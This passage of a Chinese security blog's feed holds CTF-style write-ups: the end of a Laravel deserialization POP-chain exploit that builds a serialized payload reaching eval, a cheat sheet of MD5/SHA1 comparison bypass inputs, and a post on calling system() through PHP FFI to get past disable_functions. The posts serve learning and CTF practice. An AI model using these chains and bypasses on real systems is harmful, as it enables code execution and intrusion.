&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png" alt="image-20211204140752165">&lt;/p>
&lt;p>这个链子非常的长，涉及到6个类&lt;/p>
&lt;hr>
&lt;p>pop链杀我！！！看代码有种目害的感觉了&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html#%E5%A4%8D%E7%8E%B0-1">Laravel POP链简析 &lt;/a> | &lt;a href="https://xz.aliyun.com/t/5911">Laravel5.8.x反序列化POP链&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>md5比较常见绕过小结</title><link>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</link><pubDate>Fri, 03 Dec 2021 00:24:56 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</guid><description>&lt;blockquote>
&lt;p>&lt;strong>&lt;u>写在开头：&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>别纠结&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>左侧的符号反转&amp;amp;标题是中文引号&amp;amp;有些符号消失&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>的问题&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>我也很无语&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>寄。&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;ul>
&lt;li>
&lt;pre tabindex="0">&lt;code>md5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>sha1绕过和md5绕过方式是一样的&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="md5amd5b--ab">md5($a)==md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;p>0e绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>IHKFRNS -&amp;gt; 0e256160682445802696926137988570
QLTHNDT -&amp;gt; 0e405967825401955372549139051580
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
3908336290 -&amp;gt; 0e807624498959190415881248245271
4011627063 -&amp;gt; 0e485805687034439905938362701775
4775635065 -&amp;gt; 0e998212089946640967599450361168
0e215962017 -&amp;gt; 0e291242476940776845150308577824
aabg7XSs -&amp;gt; 0e087386482136013740957780965295
aabC9RqS -&amp;gt; 0e041022518165728065344349536299
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
240610708 -&amp;gt; 0e462097431906509019562988736854
&lt;/code>&lt;/pre>&lt;p>md5碰撞&lt;/p>
&lt;pre tabindex="0">&lt;code>a=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab">md5($a)==md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>a=&amp;amp;b[]=1
&lt;/code>&lt;/pre>&lt;h2 id="md5string_getamd5md5string_getb--ab">md5((string)$_GET[&amp;lsquo;a&amp;rsquo;])==md5(md5((string)$_GET[&amp;lsquo;b&amp;rsquo;])) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>0e绕过，一个是正常0e，一个是第二次md5后还为0e的奇葩值&lt;/p>
&lt;pre tabindex="0">&lt;code>aawBzC
aabsbm9
aaaabGG5T
aaaabKGVH
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ctype_alphaa--is_numericb">md5($a)==md5($b) &amp;amp;&amp;amp; !ctype_alpha($a) &amp;amp;&amp;amp; !is_numeric($b)&lt;/h2>
&lt;p>0e绕过，一个纯数字一个纯字母&lt;/p>
&lt;pre tabindex="0">&lt;code>240610708 -&amp;gt; 0e462097431906509019562988736854
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab">md5($a)===md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab-1">md5($a)===md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab-1">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="ahashmd4a">$a!=hash(&amp;ldquo;md4&amp;rdquo;,$a)&lt;/h2>
&lt;p>0e纯数字绕过&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;0e&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$md4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">hash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/^0e[0-9]*$/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4加密前:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4加密后：&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ab--strlena3--strlenb3">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b &amp;amp;&amp;amp; strlen($a)&amp;lt;=3 &amp;amp;&amp;amp; strlen($b)&amp;lt;=3&lt;/h2>
&lt;p>INF表示无穷大，而NAN表示一个在浮点数运算中未定义或不可表述的值；除了与True之外，拿NAN与其他任何值进行松散比较或者严格比较返回结果都是FALSE
因为他们都是不确定的值，所以在与自身做比较时，会返回false&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030175015724.png" alt="image-20211030175015724">&lt;/p>
&lt;p>INF和NAN绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>a=INF&amp;amp;b=INF
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>a=NAN&amp;amp;b=NAN
&lt;/code>&lt;/pre>&lt;h2 id="this-syc--this-lover--md5this-syc--md5this-lover--sha1this-syc-sha1this-lover">($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover))&lt;/h2>
&lt;p>做题遇到的&lt;/p>
&lt;p>用原生类&lt;code>Error&lt;/code>（php7）或&lt;code>Exception&lt;/code>（php5 or 7），它有&lt;code>__toString&lt;/code>方法，被触发后会以字符串形式输出当前保存情况，包括错误信息和当前报错的行号，而跟传入的参数没有关系；所以说可以构造两个类的实例，它们行号相同（被&lt;code>__toString&lt;/code>调用后输出信息一样），但是本身不相同（传入参数不等）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;lt;?=include~&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 这个不重要 是那个题的payload
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意$a和$b写到一行&lt;/p>
&lt;h2 id="this-token--this-token_flag">$this-&amp;gt;token === $this-&amp;gt;token_flag&lt;/h2>
&lt;p>指针取地址绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>$F-&amp;gt;token=&amp;amp;$F-&amp;gt;token_flag;
&lt;/code>&lt;/pre></description></item><item><title>FFI绕过disable_functions</title><link>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</link><pubDate>Fri, 03 Dec 2021 00:01:07 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</guid><description>&lt;p>废话不多说，直接进入正题；文中参考链接统一扔后面了&lt;/p>
&lt;h2 id="preloading">Preloading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>预加载文件到opcache中，类不能有不可达的父类、接口，also only top-level entities are not nested with control structures (e.g. if()&amp;hellip;)may be preloaded；被加载后除非重启，进行的修改不影响当前进程；预加载不影响静态类成员和变量的表现；Windows中不能预加载从内部继承的类（Windows ASLR and absence of fork() don&amp;rsquo;t allow to guarantee the same addresses of internal classes in different processes.）；多版本有可能造成bug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202161008294.png" alt="image-20211202161008294">&lt;/p>
&lt;h2 id="ffi">FFI&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>文档中给了一个小栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// create FFI object, loading libc and exporting function printf()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;int printf(const char *format, ...);&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// this is regular C declaration
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// call C printf()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello %s!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接运行即可输出Hello world!；这个函数的原型是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$cdef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">]])&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>书写的形式相当的简洁，创建FFI对象（声明）-&amp;gt;调用c方法；试着直接执行一个whoami&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php -r &lt;span style="color:#d88200">&amp;#39;$ffi = FFI::cdef(&amp;#34;int system(char *command);&amp;#34;);$ffi-&amp;gt;system(&amp;#34;whoami&amp;#34;);&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现在没有第二个参数的情况下也可以正常执行system函数，看下&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/ext/ffi/ffi.c#L2853-L2879">源码&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202231908072.png" alt="image-20211202231908072">&lt;/p>
&lt;p>这种情况下lib=NULL，handle=RTLD_DEFAULT（这个注释TODO就很灵性）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232422896.png" alt="image-20211202232422896">&lt;/p>
&lt;p>随后调用&lt;code>DL_FETCH_SYMBOL&lt;/code>，&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/Zend/zend_portability.h#L166-L168">也就是&lt;/a>dlsysm&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232601190.png" alt="image-20211202232601190">&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>RTLD_DEFAULT&lt;/strong>&lt;/p>
&lt;p>Find the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the &lt;strong>RTLD_GLOBAL&lt;/strong>flag.&lt;/p>
&lt;/blockquote>
&lt;p>当dlsym第一个参数为RTLD_DEFAULT时，会按照默认共享库顺序查找system的位置，搜索范围还包括了可执行程序极其依赖中的函数表（如果设置了 RTLD_GLOBAL还会搜索动态加载库中的函数表），也就是直接在全局符号表里找了，所以不需要指定加载库，fopen这类函数也是一样&lt;/p>
&lt;p>更多的栗子请参见&lt;a href="https://wiki.php.net/rfc/ffi">文档&lt;/a>和&lt;a href="https://www.laruence.com/2020/03/11/5475.html">这一篇文章&lt;/a>，写的都很详细&lt;/p>
&lt;h3 id="跑个题ffi-in-python">跑个题：FFI in Python&lt;/h3>
&lt;p>Python的优点就不必说了，缺点是封装太好了导致运行速度上不去，那为什么不直接在Python中用C/C++呢？&lt;/p>
&lt;p>肥肠不错的想法！不过要解决的有两个问题：Marshalling（感觉编组这个翻译很奇怪 但是这个行为可以类比一下serialize） &amp;amp; Manageing Memory（内存管理）&lt;/p>
&lt;ul>
&lt;li>Python中万物皆object，而C中有严格的int float等等类型&lt;/li>
&lt;li>Python有gc，而C中需要手动malloc&lt;/li>
&lt;/ul>
&lt;p>不过不急，已经有库封装好了这些功能可以直接使用，来康康demo&lt;/p>
&lt;h4 id="ctypes库">ctypes库&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#75af00">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;In cadd: int %d float %.1f returning %.1f&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># load the lib&lt;/span>
